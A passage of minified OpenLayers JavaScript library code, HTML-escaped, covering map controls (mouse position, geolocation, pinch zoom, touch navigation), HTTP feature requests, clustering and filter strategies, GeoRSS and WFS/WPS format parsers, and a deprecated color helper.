b?a:"%"});a=a.replace(/\\\./g,".");return a=a.replace(/(\\)?\\\*/g,function(a,b){return b?a:"*"})}var b={};b[OpenLayers.Filter.Comparison.EQUAL_TO]="eq";b[OpenLayers.Filter.Comparison.NOT_EQUAL_TO]="ne";b[OpenLayers.Filter.Comparison.LESS_THAN]= "lt";b[OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO]="lte";b[OpenLayers.Filter.Comparison.GREATER_THAN]="gt";b[OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO]="gte";b[OpenLayers.Filter.Comparison.LIKE]="ilike";return OpenLayers.Class(OpenLayers.Format,{wildcarded:!1,srsInBBOX:!1,write:function(c,d){d=d||{};var e=c.CLASS_NAME,e=e.substring(e.lastIndexOf(".")+1);switch(e){case "Spatial":switch(c.type){case OpenLayers.Filter.Spatial.BBOX:d.bbox=c.value.toArray();this.srsInBBOX&amp;&amp;c.projection&amp;&amp; d.bbox.push(c.projection.getCode());break;case OpenLayers.Filter.Spatial.DWITHIN:d.tolerance=c.distance;case OpenLayers.Filter.Spatial.WITHIN:d.lon=c.value.x;d.lat=c.value.y;break;default:OpenLayers.Console.warn("Unknown spatial filter type "+c.type)}break;case "Comparison":e=b[c.type];if(void 0!==e){var f=c.value;c.type==OpenLayers.Filter.Comparison.LIKE&amp;&amp;(f=a(f),this.wildcarded&amp;&amp;(f="%"+f+"%"));d[c.property+"__"+e]=f;d.queryable=d.queryable||[];d.queryable.push(c.property)}else OpenLayers.Console.warn("Unknown comparison filter type "+ c.type);break;case "Logical":if(c.type===OpenLayers.Filter.Logical.AND)for(e=0,f=c.filters.length;e&lt;f;e++)d=this.write(c.filters[e],d);else OpenLayers.Console.warn("Unsupported logical filter type "+c.type);break;default:OpenLayers.Console.warn("Unknown filter type "+e)}return d},CLASS_NAME:"OpenLayers.Format.QueryStringFilter"})}();OpenLayers.Control.MousePosition=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,element:null,prefix:"",separator:", ",suffix:"",numDigits:5,granularity:10,emptyString:null,lastXy:null,displayProjection:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.events.register("mousemove",this,this.redraw),this.map.events.register("mouseout",this,this.reset), this.redraw(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.map.events.unregister("mousemove",this,this.redraw),this.map.events.unregister("mouseout",this,this.reset),this.element.innerHTML="",!0):!1},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.div.left="",this.div.top="",this.element=this.div);return this.div},redraw:function(a){var b;if(null==a)this.reset();else if(null==this.lastXy||Math.abs(a.xy.x- this.lastXy.x)>this.granularity||Math.abs(a.xy.y-this.lastXy.y)>this.granularity)this.lastXy=a.xy;else if(b=this.map.getLonLatFromPixel(a.xy))this.displayProjection&amp;&amp;b.transform(this.map.getProjectionObject(),this.displayProjection),this.lastXy=a.xy,a=this.formatOutput(b),a!=this.element.innerHTML&amp;&amp;(this.element.innerHTML=a)},reset:function(a){null!=this.emptyString&amp;&amp;(this.element.innerHTML=this.emptyString)},formatOutput:function(a){var b=parseInt(this.numDigits);return this.prefix+a.lon.toFixed(b)+ this.separator+a.lat.toFixed(b)+this.suffix},CLASS_NAME:"OpenLayers.Control.MousePosition"});OpenLayers.Control.Geolocate=OpenLayers.Class(OpenLayers.Control,{geolocation:null,available:"geolocation"in navigator,bind:!0,watch:!1,geolocationOptions:null,destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.available&amp;&amp;!this.geolocation&amp;&amp;(this.geolocation=navigator.geolocation);return this.geolocation?OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.watch?this.watchId=this.geolocation.watchPosition(OpenLayers.Function.bind(this.geolocate, this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions):this.getCurrentLocation(),!0):!1:(this.events.triggerEvent("locationuncapable"),!1)},deactivate:function(){this.active&amp;&amp;null!==this.watchId&amp;&amp;this.geolocation.clearWatch(this.watchId);return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},geolocate:function(a){var b=(new OpenLayers.LonLat(a.coords.longitude,a.coords.latitude)).transform(new OpenLayers.Projection("EPSG:4326"),this.map.getProjectionObject());this.bind&amp;&amp; this.map.setCenter(b);this.events.triggerEvent("locationupdated",{position:a,point:new OpenLayers.Geometry.Point(b.lon,b.lat)})},getCurrentLocation:function(){if(!this.active||this.watch)return!1;this.geolocation.getCurrentPosition(OpenLayers.Function.bind(this.geolocate,this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions);return!0},failure:function(a){this.events.triggerEvent("locationfailed",{error:a})},CLASS_NAME:"OpenLayers.Control.Geolocate"});OpenLayers.Tile.UTFGrid=OpenLayers.Class(OpenLayers.Tile,{url:null,utfgridResolution:2,json:null,format:null,destroy:function(){this.clear();OpenLayers.Tile.prototype.destroy.apply(this,arguments)},draw:function(){var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);if(a)if(this.isLoading?(this.abortLoading(),this.events.triggerEvent("reload")):(this.isLoading=!0,this.events.triggerEvent("loadstart")),this.url=this.layer.getURL(this.bounds),this.layer.useJSONP){var b=new OpenLayers.Protocol.Script({url:this.url, callback:function(a){this.isLoading=!1;this.events.triggerEvent("loadend");this.json=a.data},scope:this});b.read();this.request=b}else this.request=OpenLayers.Request.GET({url:this.url,callback:function(a){this.isLoading=!1;this.events.triggerEvent("loadend");200===a.status&amp;&amp;this.parseData(a.responseText)},scope:this});else this.unload();return a},abortLoading:function(){this.request&amp;&amp;(this.request.abort(),delete this.request);this.isLoading=!1},getFeatureInfo:function(a,b){var c=null;if(this.json){var d= this.getFeatureId(a,b);null!==d&amp;&amp;(c={id:d,data:this.json.data[d]})}return c},getFeatureId:function(a,b){var c=null;if(this.json){var d=this.utfgridResolution,d=this.json.grid[Math.floor(b/d)].charCodeAt(Math.floor(a/d)),d=this.indexFromCharCode(d),e=this.json.keys;!isNaN(d)&amp;&amp;d in e&amp;&amp;(c=e[d])}return c},indexFromCharCode:function(a){93&lt;=a&amp;&amp;a--;35&lt;=a&amp;&amp;a--;return a-32},parseData:function(a){this.format||(this.format=new OpenLayers.Format.JSON);this.json=this.format.read(a)},clear:function(){this.json= null},CLASS_NAME:"OpenLayers.Tile.UTFGrid"});OpenLayers.Protocol.HTTP=OpenLayers.Class(OpenLayers.Protocol,{url:null,headers:null,params:null,callback:null,scope:null,readWithPOST:!1,updateWithPOST:!1,deleteWithPOST:!1,wildcarded:!1,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.headers={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter){var b=new OpenLayers.Format.QueryStringFilter({wildcarded:this.wildcarded,srsInBBOX:this.srsInBBOX});this.filterToParams= function(a,d){return b.write(a,d)}}},destroy:function(){this.headers=this.params=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=a||{};a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a=OpenLayers.Util.applyDefaults(a,this.options);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=void 0!==a.readWithPOST?a.readWithPOST:this.readWithPOST,c=new OpenLayers.Protocol.Response({requestType:"read"}); b?(b=a.headers||{},b["Content-Type"]="application/x-www-form-urlencoded",c.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,c,a),data:OpenLayers.Util.getParameterString(a.params),headers:b})):c.priv=OpenLayers.Request.GET({url:a.url,callback:this.createCallback(this.handleRead,c,a),params:a.params,headers:a.headers});return c},handleRead:function(a,b){this.handleResponse(a,b)},create:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({reqFeatures:a, requestType:"create"});c.priv=OpenLayers.Request.POST({url:b.url,callback:this.createCallback(this.handleCreate,c,b),headers:b.headers,data:this.format.write(a)});return c},handleCreate:function(a,b){this.handleResponse(a,b)},update:function(a,b){b=b||{};var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:"update"});d.priv=OpenLayers.Request[this.updateWithPOST?"POST":"PUT"]({url:c,callback:this.createCallback(this.handleUpdate, d,b),headers:b.headers,data:this.format.write(a)});return d},handleUpdate:function(a,b){this.handleResponse(a,b)},"delete":function(a,b){b=b||{};var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response({reqFeatures:a,requestType:"delete"}),e=this.deleteWithPOST?"POST":"DELETE",c={url:c,callback:this.createCallback(this.handleDelete,d,b),headers:b.headers};this.deleteWithPOST&amp;&amp;(c.data=this.format.write(a));d.priv=OpenLayers.Request[e](c); return d},handleDelete:function(a,b){this.handleResponse(a,b)},handleResponse:function(a,b){var c=a.priv;b.callback&amp;&amp;(200&lt;=c.status&amp;&amp;300>c.status?("delete"!=a.requestType&amp;&amp;(a.features=this.parseFeatures(c)),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,b.callback.call(b.scope,a))},parseFeatures:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},commit:function(a,b){function c(a){for(var b= a.features?a.features.length:0,c=Array(b),e=0;e&lt;b;++e)c[e]=a.features[e].fid;r.insertIds=c;d.apply(this,[a])}function d(a){this.callUserCallback(a,b);q=q&amp;&amp;a.success();f++;f>=p&amp;&amp;b.callback&amp;&amp;(r.code=q?OpenLayers.Protocol.Response.SUCCESS:OpenLayers.Protocol.Response.FAILURE,b.callback.apply(b.scope,[r]))}b=OpenLayers.Util.applyDefaults(b,this.options);var e=[],f=0,g={};g[OpenLayers.State.INSERT]=[];g[OpenLayers.State.UPDATE]=[];g[OpenLayers.State.DELETE]=[];for(var h,k,l=[],m=0,n=a.length;m&lt;n;++m)if(h= a[m],k=g[h.state])k.push(h),l.push(h);var p=(0&lt;g[OpenLayers.State.INSERT].length?1:0)+g[OpenLayers.State.UPDATE].length+g[OpenLayers.State.DELETE].length,q=!0,r=new OpenLayers.Protocol.Response({reqFeatures:l});h=g[OpenLayers.State.INSERT];0&lt;h.length&amp;&amp;e.push(this.create(h,OpenLayers.Util.applyDefaults({callback:c,scope:this},b.create)));h=g[OpenLayers.State.UPDATE];for(m=h.length-1;0&lt;=m;--m)e.push(this.update(h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b.update)));h=g[OpenLayers.State.DELETE]; for(m=h.length-1;0&lt;=m;--m)e.push(this["delete"](h[m],OpenLayers.Util.applyDefaults({callback:d,scope:this},b["delete"])));return e},abort:function(a){a&amp;&amp;a.priv.abort()},callUserCallback:function(a,b){var c=b[a.requestType];c&amp;&amp;c.callback&amp;&amp;c.callback.call(c.scope,a)},CLASS_NAME:"OpenLayers.Protocol.HTTP"});OpenLayers.Strategy.Cluster=OpenLayers.Class(OpenLayers.Strategy,{distance:20,threshold:null,features:null,clusters:null,clustering:!1,resolution:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,featuresremoved:this.clearCache,moveend:this.cluster,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures, featuresremoved:this.clearCache,moveend:this.cluster,scope:this}));return a},cacheFeatures:function(a){var b=!0;this.clustering||(this.clearCache(),this.features=a.features,this.cluster(),b=!1);return b},clearCache:function(){this.clustering||(this.features=null)},cluster:function(a){if((!a||a.zoomChanged)&amp;&amp;this.features&amp;&amp;(a=this.layer.map.getResolution(),a!=this.resolution||!this.clustersExist())){this.resolution=a;a=[];for(var b,c,d,e=0;e&lt;this.features.length;++e)if(b=this.features[e],b.geometry){c= !1;for(var f=a.length-1;0&lt;=f;--f)if(d=a[f],this.shouldCluster(d,b)){this.addToCluster(d,b);c=!0;break}c||a.push(this.createCluster(this.features[e]))}this.clustering=!0;this.layer.removeAllFeatures();this.clustering=!1;if(0&lt;a.length){if(1&lt;this.threshold)for(b=a.slice(),a=[],e=0,d=b.length;e&lt;d;++e)c=b[e],c.attributes.count&lt;this.threshold?Array.prototype.push.apply(a,c.cluster):a.push(c);this.clustering=!0;this.layer.addFeatures(a);this.clustering=!1}this.clusters=a}},clustersExist:function(){var a= !1;if(this.clusters&amp;&amp;0&lt;this.clusters.length&amp;&amp;this.clusters.length==this.layer.features.length)for(var a=!0,b=0;b&lt;this.clusters.length;++b)if(this.clusters[b]!=this.layer.features[b]){a=!1;break}return a},shouldCluster:function(a,b){var c=a.geometry.getBounds().getCenterLonLat(),d=b.geometry.getBounds().getCenterLonLat();return Math.sqrt(Math.pow(c.lon-d.lon,2)+Math.pow(c.lat-d.lat,2))/this.resolution&lt;=this.distance},addToCluster:function(a,b){a.cluster.push(b);a.attributes.count+=1},createCluster:function(a){var b= a.geometry.getBounds().getCenterLonLat(),b=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(b.lon,b.lat),{count:1});b.cluster=[a];return b},CLASS_NAME:"OpenLayers.Strategy.Cluster"});OpenLayers.Strategy.Filter=OpenLayers.Class(OpenLayers.Strategy,{filter:null,cache:null,caching:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);a&amp;&amp;(this.cache=[],this.layer.events.on({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this}));return a},deactivate:function(){this.cache=null;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un({beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this}); return OpenLayers.Strategy.prototype.deactivate.apply(this,arguments)},handleAdd:function(a){if(!this.caching&amp;&amp;this.filter){var b=a.features;a.features=[];for(var c,d=0,e=b.length;d&lt;e;++d)c=b[d],this.filter.evaluate(c)?a.features.push(c):this.cache.push(c)}},handleRemove:function(a){this.caching||(this.cache=[])},setFilter:function(a){this.filter=a;a=this.cache;this.cache=[];this.handleAdd({features:this.layer.features});0&lt;this.cache.length&amp;&amp;(this.caching=!0,this.layer.removeFeatures(this.cache.slice()), this.caching=!1);0&lt;a.length&amp;&amp;(a={features:a},this.handleAdd(a),0&lt;a.features.length&amp;&amp;(this.caching=!0,this.layer.addFeatures(a.features),this.caching=!1))},CLASS_NAME:"OpenLayers.Strategy.Filter"});OpenLayers.Protocol.SOS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.SOS.DEFAULTS);var b=OpenLayers.Protocol.SOS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported SOS version: "+a.version;return new b(a)};OpenLayers.Protocol.SOS.DEFAULTS={version:"1.0.0"};OpenLayers.Format.WFSDescribeFeatureType=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g},namespaces:{xsd:"http://www.w3.org/2001/XMLSchema"},readers:{xsd:{schema:function(a,b){var c=[],d={},e,f;this.readChildNodes(a,{complexTypes:c,customTypes:d});var g=a.attributes,h,k;e=0;for(f=g.length;e&lt;f;++e)h=g[e],k=h.name,0===k.indexOf("xmlns")?this.setNamespace(k.split(":")[1]||"",h.value):b[k]=h.value;b.featureTypes=c;b.targetPrefix=this.namespaceAlias[b.targetNamespace];e=0;for(f= c.length;e&lt;f;++e)g=c[e],h=d[g.typeName],d[g.typeName]&amp;&amp;(g.typeName=h.name)},complexType:function(a,b){var c={typeName:a.getAttribute("name")};this.readChildNodes(a,c);b.complexTypes.push(c)},complexContent:function(a,b){this.readChildNodes(a,b)},extension:function(a,b){this.readChildNodes(a,b)},sequence:function(a,b){var c={elements:[]};this.readChildNodes(a,c);b.properties=c.elements},element:function(a,b){var c;if(b.elements){var d={};c=a.attributes;for(var e,f=0,g=c.length;f&lt;g;++f)e=c[f],d[e.name]= e.value;c=d.type;c||(c={},this.readChildNodes(a,c),d.restriction=c,d.type=c.base);d.localType=(c.base||c).split(":").pop();b.elements.push(d);this.readChildNodes(a,d)}b.complexTypes&amp;&amp;(c=a.getAttribute("type"),d=c.split(":").pop(),b.customTypes[d]={name:a.getAttribute("name"),type:c})},annotation:function(a,b){b.annotation={};this.readChildNodes(a,b.annotation)},appinfo:function(a,b){b.appinfo||(b.appinfo=[]);b.appinfo.push(this.getChildValue(a))},documentation:function(a,b){b.documentation||(b.documentation= []);var c=this.getChildValue(a);b.documentation.push({lang:a.getAttribute("xml:lang"),textContent:c.replace(this.regExes.trimSpace,"")})},simpleType:function(a,b){this.readChildNodes(a,b)},restriction:function(a,b){b.base=a.getAttribute("base");this.readRestriction(a,b)}}},readRestriction:function(a,b){for(var c=a.childNodes,d,e,f=0,g=c.length;f&lt;g;++f)d=c[f],1==d.nodeType&amp;&amp;(e=d.nodeName.split(":").pop(),d=d.getAttribute("value"),b[e]?("string"==typeof b[e]&amp;&amp;(b[e]=[b[e]]),b[e].push(d)):b[e]=d)},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};if("ExceptionReport"===a.nodeName.split(":").pop()){var c=new OpenLayers.Format.OGCExceptionReport;b.error=c.read(a)}else this.readNode(a,b);return b},CLASS_NAME:"OpenLayers.Format.WFSDescribeFeatureType"});OpenLayers.Format.GeoRSS=OpenLayers.Class(OpenLayers.Format.XML,{rssns:"http://backend.userland.com/rss2",featureNS:"http://mapserver.gis.umn.edu/mapserver",georssns:"http://www.georss.org/georss",geons:"http://www.w3.org/2003/01/geo/wgs84_pos#",featureTitle:"Untitled",featureDescription:"No Description",gmlParser:null,xy:!1,createGeometryFromItem:function(a){var b=this.getElementsByTagNameNS(a,this.georssns,"point"),c=this.getElementsByTagNameNS(a,this.geons,"lat"),d=this.getElementsByTagNameNS(a, this.geons,"long"),e=this.getElementsByTagNameNS(a,this.georssns,"line"),f=this.getElementsByTagNameNS(a,this.georssns,"polygon"),g=this.getElementsByTagNameNS(a,this.georssns,"where");a=this.getElementsByTagNameNS(a,this.georssns,"box");if(0&lt;b.length||0&lt;c.length&amp;&amp;0&lt;d.length){0&lt;b.length?(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s+/),2!=c.length&amp;&amp;(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s*,\s*/))):c=[parseFloat(c[0].firstChild.nodeValue),parseFloat(d[0].firstChild.nodeValue)]; var h=new OpenLayers.Geometry.Point(c[1],c[0])}else if(0&lt;e.length){c=OpenLayers.String.trim(this.getChildValue(e[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.LineString(d)}else if(0&lt;f.length){c=OpenLayers.String.trim(this.getChildValue(f[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])}else 0&lt; g.length?(this.gmlParser||(this.gmlParser=new OpenLayers.Format.GML({xy:this.xy})),h=this.gmlParser.parseFeature(g[0]).geometry):0&lt;a.length&amp;&amp;(c=OpenLayers.String.trim(a[0].firstChild.nodeValue).split(/\s+/),d=[],3&lt;c.length&amp;&amp;(b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b)),h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])); h&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection)&amp;&amp;h.transform(this.externalProjection,this.internalProjection);return h},createFeatureFromItem:function(a){var b=this.createGeometryFromItem(a),c=this._getChildValue(a,"*","title",this.featureTitle),d=this._getChildValue(a,"*","description",this._getChildValue(a,"*","content",this._getChildValue(a,"*","summary",this.featureDescription))),e=this._getChildValue(a,"*","link");if(!e)try{e=this.getElementsByTagNameNS(a,"*","link")[0].getAttribute("href")}catch(f){e= null}a=this._getChildValue(a,"*","id",null);b=new OpenLayers.Feature.Vector(b,{title:c,description:d,link:e});b.fid=a;return b},_getChildValue:function(a,b,c,d){return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;a[0]&amp;&amp;a[0].firstChild&amp;&amp;a[0].firstChild.nodeValue?this.getChildValue(a[0]):void 0==d?"":d},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null,b=this.getElementsByTagNameNS(a,"*","item");0==b.length&amp;&amp;(b=this.getElementsByTagNameNS(a,"*","entry")); a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=this.createFeatureFromItem(b[d]);return c},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNS(this.rssns,"rss");for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createFeatureXML(a[c]))}else b=this.createFeatureXML(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.rssns,"item"),d=this.createElementNS(this.rssns,"title"); d.appendChild(this.createTextNode(a.attributes.title?a.attributes.title:""));var e=this.createElementNS(this.rssns,"description");e.appendChild(this.createTextNode(a.attributes.description?a.attributes.description:""));c.appendChild(d);c.appendChild(e);a.attributes.link&amp;&amp;(d=this.createElementNS(this.rssns,"link"),d.appendChild(this.createTextNode(a.attributes.link)),c.appendChild(d));for(var f in a.attributes)"link"!=f&amp;&amp;("title"!=f&amp;&amp;"description"!=f)&amp;&amp;(d=this.createTextNode(a.attributes[f]),e=f,-1!= f.search(":")&amp;&amp;(e=f.split(":")[1]),e=this.createElementNS(this.featureNS,"feature:"+e),e.appendChild(d),c.appendChild(e));c.appendChild(b);return c},buildGeometryNode:function(a){this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b;if("OpenLayers.Geometry.Polygon"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:polygon"),b.appendChild(this.buildCoordinatesNode(a.components[0]));else if("OpenLayers.Geometry.LineString"== a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:line"),b.appendChild(this.buildCoordinatesNode(a));else if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:point"),b.appendChild(this.buildCoordinatesNode(a));else throw"Couldn't parse "+a.CLASS_NAME;return b},buildCoordinatesNode:function(a){var b=null;a.components&amp;&amp;(b=a.components);if(b){a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=b[d].y+" "+b[d].x;b=c.join(" ")}else b=a.y+" "+a.x;return this.createTextNode(b)}, CLASS_NAME:"OpenLayers.Format.GeoRSS"});OpenLayers.Format.WPSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.WPSCapabilities"});OpenLayers.Format.WPSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows/1.1",wps:"http://www.opengis.net/wps/1.0.0",xlink:"http://www.w3.org/1999/xlink"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement); var b={};this.readNode(a,b);return b},readers:{wps:{Capabilities:function(a,b){this.readChildNodes(a,b)},ProcessOfferings:function(a,b){b.processOfferings={};this.readChildNodes(a,b.processOfferings)},Process:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion")};this.readChildNodes(a,c);b[c.identifier]=c},Languages:function(a,b){b.languages=[];this.readChildNodes(a,b.languages)},Default:function(a,b){var c={isDefault:!0};this.readChildNodes(a,c);b.push(c)}, Supported:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSCapabilities.v1_0_0"});OpenLayers.Control.PinchZoom=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,pinchOrigin:null,currentCenter:null,autoActivate:!0,preserveCenter:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.handler=new OpenLayers.Handler.Pinch(this,{start:this.pinchStart,move:this.pinchMove,done:this.pinchDone},this.handlerOptions)},pinchStart:function(a,b){var c=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy;this.currentCenter= this.pinchOrigin=c},pinchMove:function(a,b){var c=b.scale,d=this.map.layerContainerOriginPx,e=this.pinchOrigin,f=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy,g=Math.round(d.x+f.x-e.x+(c-1)*(d.x-e.x)),d=Math.round(d.y+f.y-e.y+(c-1)*(d.y-e.y));this.map.applyTransform(g,d,c);this.currentCenter=f},pinchDone:function(a,b,c){this.map.applyTransform();a=this.map.getZoomForResolution(this.map.getResolution()/c.scale,!0);if(a!==this.map.getZoom()||!this.currentCenter.equals(this.pinchOrigin)){b= this.map.getResolutionForZoom(a);c=this.map.getLonLatFromPixel(this.pinchOrigin);var d=this.currentCenter,e=this.map.getSize();c.lon+=b*(e.w/2-d.x);c.lat-=b*(e.h/2-d.y);this.map.div.clientWidth=this.map.div.clientWidth;this.map.setCenter(c,a)}},CLASS_NAME:"OpenLayers.Control.PinchZoom"});OpenLayers.Control.TouchNavigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,clickHandlerOptions:null,documentDrag:!1,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null;this.pinchZoom&amp;&amp;(this.pinchZoom.destroy(),delete this.pinchZoom);OpenLayers.Control.prototype.destroy.apply(this, arguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.dragPan.activate(),this.handlers.click.activate(),this.pinchZoom.activate(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.dragPan.deactivate(),this.handlers.click.deactivate(),this.pinchZoom.deactivate(),!0):!1},draw:function(){var a={click:this.defaultClick,dblclick:this.defaultDblClick},b=OpenLayers.Util.extend({"double":!0,stopDouble:!0, pixelTolerance:2},this.clickHandlerOptions);this.handlers.click=new OpenLayers.Handler.Click(this,a,b);this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map,documentDrag:this.documentDrag},this.dragPanOptions));this.dragPan.draw();this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map},this.pinchZoomOptions))},defaultClick:function(a){a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+ 1,a.xy)},CLASS_NAME:"OpenLayers.Control.TouchNavigation"});OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||{}; OpenLayers.Rico.Color=OpenLayers.Class({initialize:function(a,b,c){this.rgb={r:a,g:b,b:c}},setRed:function(a){this.rgb.r=a},setGreen:function(a){this.rgb.g=a},setBlue:function(a){this.rgb.b=a},setHue:function(a){var b=this.asHSB();b.h=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setSaturation:function(a){var b=this.asHSB();b.s=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setBrightness:function(a){var b=this.asHSB();b.b=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)}, darken:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.max(b.b-a,0))},brighten:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.min(b.b+a,1))},blend:function(a){this.rgb.r=Math.floor((this.rgb.r+a.rgb.r)/2);this.rgb.g=Math.floor((this.rgb.g+a.rgb.g)/2);this.rgb.b=Math.floor((this.rgb.b+a.rgb.b)/2)},isBright:function(){this.asHSB();return 0.5&lt;this.asHSB().b},isDark:function(){return!this.isBright()},asRGB:function(){return"rgb("+ this.rgb.r+","+this.rgb.g+","+this.rgb.b+")"},asHex:function(){return"#"+this.rgb.r.toColorPart()+this.rgb.g.toColorPart()+this.rgb.b.toColorPart()},asHSB:function(){return OpenLayers.Rico.Color.RGBtoHSB(this.rgb.r,this.rgb.g,this.rgb.b)},toString:function(){return this.asHex()}}); OpenLayers.Rico.Color.createFromHex=function(a){if(4==a.length){var b=a;a="#";for(var 